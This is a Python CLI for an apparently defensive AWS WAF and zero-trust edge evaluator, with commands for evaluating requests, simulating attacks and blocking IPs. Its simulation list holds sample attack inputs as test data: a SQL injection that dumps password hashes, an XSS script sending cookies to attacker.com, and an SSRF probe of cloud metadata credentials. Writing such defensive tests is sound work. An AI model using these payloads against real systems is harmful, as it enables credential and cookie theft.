"""Zero-Trust Edge Perimeter Interactive Command Line Interface.

Provides real-time request evaluation, attack simulations, dynamic IP blocking, and SOC bulletins.
"""

import argparse
import sys
from typing import List

# Ensure UTF-8 output on Windows consoles
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except AttributeError:
        pass

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from .core.config import EvaluationDecision, MitigationAction, RequestContext
from .core.evaluator import ZeroTrustEdgeEvaluator
from .mitigation.waf_controller import AwsWafController
from .reporters.telemetry_streamer import EdgeTelemetryStreamer
from .reporters.threat_bulletin import ThreatBulletinGenerator

console = Console(force_terminal=True)

BANNER = r"""[bold cyan]
  ______                     ______                __ 
 /_  __/__  _________       /_  __/______  _______/ /_
  / / / _ \/ ___/ __ \       / / / ___/ / / / ___/ __/
 / / /  __/ /  / /_/ /      / / / /  / /_/ (__  ) /_  
/_/  \___/_/   \____/      /_/ /_/   \__,_/____/\__/  
[/bold cyan][bold dim]Enterprise AWS Zero-Trust Edge Perimeter & Intelligent WAF Bot Defense Mesh[/bold dim]
"""


def render_banner():
    console.print(BANNER)


def cmd_evaluate(args):
    """Evaluates an individual inbound HTTP request context against edge policies."""
    evaluator = ZeroTrustEdgeEvaluator()
    headers = {"User-Agent": args.user_agent} if args.user_agent else {}
    context = RequestContext(
        client_ip=args.ip,
        method=args.method.upper(),
        uri=args.uri,
        headers=headers,
        query_string=args.query or "",
        body=args.body or "",
        country_code=args.country.upper(),
        asn=args.asn,
    )

    console.print(
        Panel(
            f"[bold white]Evaluating Edge Request:[/bold white] {context.method} {context.uri}\n"
            f"[dim]Client IP: {context.client_ip} | Geo: {context.country_code} | ASN: {context.asn}[/dim]",
            title="[Zero-Trust Edge Ingress]",
            border_style="cyan",
        )
    )

    decision = evaluator.evaluate(context)
    action_colors = {
        MitigationAction.ALLOW: "green",
        MitigationAction.CHALLENGE_CAPTCHA: "yellow",
        MitigationAction.DIVERT_HONEYPOT: "magenta",
        MitigationAction.BLOCK: "red",
    }
    color = action_colors.get(decision.action, "white")

    console.print(
        Panel(
            f"[bold {color}]Mitigation Action: {decision.action.value}[/bold {color}]\n"
            f"[bold white]Calculated Risk Score:[/bold white] [{color}]{decision.risk_score} / 100[/{color}]\n"
            f"[bold dim]Edge Execution Latency:[/bold dim] {decision.execution_time_ms} ms\n"
            f"[bold white]Matched Policy Rules:[/bold white] {', '.join(decision.matched_rules) or 'None'}\n"
            f"[bold dim]Triggered Explanations:[/bold dim] {'; '.join(decision.reasons)}",
            title="[Evaluation Decision]",
            border_style=color,
        )
    )


def cmd_simulate(args):
    """Executes multi-scenario edge threat simulation batch."""
    evaluator = ZeroTrustEdgeEvaluator()

    scenarios = [
        # 1. Clean User
        RequestContext(
            client_ip="198.51.100.12",
            method="GET",
            uri="/products/catalog",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0"},
            country_code="US",
            asn=15169,
        ),
        # 2. SQL Injection Attack
        RequestContext(
            client_ip="203.0.113.45",
            method="POST",
            uri="/api/v1/search",
            query_string="category=books' UNION SELECT null, username, password_hash FROM users--",
            headers={"User-Agent": "Mozilla/5.0"},
            country_code="US",
        ),
        # 3. Malicious Scraper Bot
        RequestContext(
            client_ip="185.220.101.5",
            method="GET",
            uri="/api/v1/pricing",
            headers={"User-Agent": "sqlmap/1.7#stable (https://sqlmap.org)"},
            country_code="DE",
            asn=9009,
        ),
        # 4. Cross-Site Scripting (XSS)
        RequestContext(
            client_ip="192.0.2.89",
            method="POST",
            uri="/comments/submit",
            body="<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
            country_code="US",
        ),
        # 5. Sanctioned Nation Geolocation
        RequestContext(
            client_ip="175.45.176.1",
            method="GET",
            uri="/portal",
            country_code="KP",
            asn=131279,
        ),
        # 6. Honeypot Decoy Probe
        RequestContext(
            client_ip="198.51.100.99",
            method="GET",
            uri="/.git/config",
            headers={"User-Agent": "dirbuster/1.0"},
            country_code="US",
        ),
        # 7. Cloud Metadata SSRF Probe
        RequestContext(
            client_ip="203.0.113.200",
            method="GET",
            uri="/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials",
            country_code="US",
        ),
    ]

    console.print(
        Panel(
            f"[bold green]Executing Zero-Trust Edge Attack Simulation[/bold green]\n"
            f"[dim]Running {len(scenarios)} diverse traffic profiles through multi-layer WAF mesh...[/dim]",
            title="[SOC Attack Simulator]",
            border_style="green",
        )
    )

    decisions: List[EvaluationDecision] = []
    table = Table(title="[Edge Request Inspection Telemetry]", show_header=True, header_style="bold cyan")
    table.add_column("Client IP", style="white", width=16)
    table.add_column("Target URI", style="cyan", width=28)
    table.add_column("Country", style="dim", width=8)
    table.add_column("Risk Score", style="bold", width=12)
    table.add_column("Mitigation Action", style="bold", width=20)
    table.add_column("Triggered Rule", style="yellow", width=26)

    action_colors = {
        MitigationAction.ALLOW: "green",
        MitigationAction.CHALLENGE_CAPTCHA: "yellow",
        MitigationAction.DIVERT_HONEYPOT: "magenta",
        MitigationAction.BLOCK: "red",
    }

    for req in scenarios:
        decision = evaluator.evaluate(req)
        decisions.append(decision)
        color = action_colors.get(decision.action, "white")
        table.add_row(
            decision.client_ip,
            req.uri[:26],
            req.country_code,
            f"[{color}]{decision.risk_score} / 100[/{color}]",
            f"[{color}]{decision.action.value}[/{color}]",
            (decision.matched_rules[0] if decision.matched_rules else "CLEAN_TRAFFIC")[:25],
        )

    console.print(table)

    # Telemetry Snapshot
    snapshot = EdgeTelemetryStreamer.aggregate(decisions)
    bulletin = ThreatBulletinGenerator()
    report = bulletin.generate_report(snapshot, decisions)
    out_file = bulletin.save_report(report)

    console.print(
        Panel(
            f"[bold green]Total Evaluated Requests:[/bold green] {snapshot.total_evaluated}\n"
            f"[bold green]Allowed Requests:[/bold green]        {snapshot.allowed_count}\n"
            f"[bold yellow]Challenged (CAPTCHA):[/bold yellow]   {snapshot.challenged_count}\n"
            f"[bold magenta]Diverted to Honeypot:[/bold magenta]   {snapshot.diverted_count}\n"
            f"[bold red]Hard Blocked Threats:[/bold red]   {snapshot.blocked_count}\n"
            f"[bold cyan]Average Edge Latency:[/bold cyan]    {snapshot.avg_latency_ms} ms\n"
            f"[bold dim]Tamper-Evident SHA-256:[/bold dim]   {report['sha256_checksum']}\n"
            f"[bold dim]Telemetry Artifact:[/bold dim]       {out_file}",
            title="[Aggregated SOC Edge Metrics]",
            border_style="cyan",
        )
    )


def cmd_block_ip(args):
    """Dynamic IP Set manipulation."""
    controller = AwsWafController(scope="CLOUDFRONT")
    ip = args.ip
    name = args.name or "AutomatedBannedIPSet"
    ip_set_id = args.id or "mock-id-waf-ipset"

    if args.action == "add":
        success = controller.add_ip_to_blocklist(ip, name=name, ip_set_id=ip_set_id)
        if success:
            console.print(f"[bold green][✓] Successfully added {ip}/32 to WAF IP Set {name}[/bold green]")
        else:
            console.print(f"[yellow][!] Offline demo mode: Simulated addition of {ip}/32 to WAF IP Set {name}[/yellow]")
    else:
        success = controller.remove_ip_from_blocklist(ip, name=name, ip_set_id=ip_set_id)
        if success:
            console.print(f"[bold green][✓] Successfully removed {ip}/32 from WAF IP Set {name}[/bold green]")
        else:
            console.print(
                f"[yellow][!] Offline demo mode: Simulated removal of {ip}/32 from WAF IP Set {name}[/yellow]"
            )


def main():
    parser = argparse.ArgumentParser(description="Zero-Trust Cloud Edge & Intelligent WAF Bot Defense Mesh CLI")
    subparsers = parser.add_subparsers(dest="command", help="Operational Subcommands")

    # Evaluate
    eval_parser = subparsers.add_parser("evaluate", help="Inspect individual HTTP request")
    eval_parser.add_argument("--ip", default="198.51.100.5", help="Client IP Address")
    eval_parser.add_argument("--method", default="GET", help="HTTP Method")
    eval_parser.add_argument("--uri", default="/", help="URI path")
    eval_parser.add_argument("--query", default="", help="Query string parameters")
    eval_parser.add_argument("--body", default="", help="HTTP Request Body")
    eval_parser.add_argument("--user-agent", default="Mozilla/5.0", help="Inbound User-Agent header")
    eval_parser.add_argument("--country", default="US", help="Two-letter ISO Country Code")
    eval_parser.add_argument("--asn", type=int, default=15169, help="Autonomous System Number")

    # Simulate
    subparsers.add_parser("simulate", help="Run multi-vector edge attack simulation")

    # Block IP
    block_parser = subparsers.add_parser("block-ip", help="Manage dynamic WAF IP Sets")
    block_parser.add_argument("action", choices=["add", "remove"], help="Action to execute")
    block_parser.add_argument("--ip", required=True, help="IP to block/unblock")
    block_parser.add_argument("--name", default="AutomatedBannedIPSet", help="WAF IP Set Name")
    block_parser.add_argument("--id", default="mock-waf-ipset-id", help="WAF IP Set ID")

    args = parser.parse_args()
    render_banner()

    if args.command == "evaluate":
        cmd_evaluate(args)
    elif args.command == "simulate":
        cmd_simulate(args)
    elif args.command == "block-ip":
        cmd_block_ip(args)
    else:
        cmd_simulate(args)


if __name__ == "__main__":
    main()
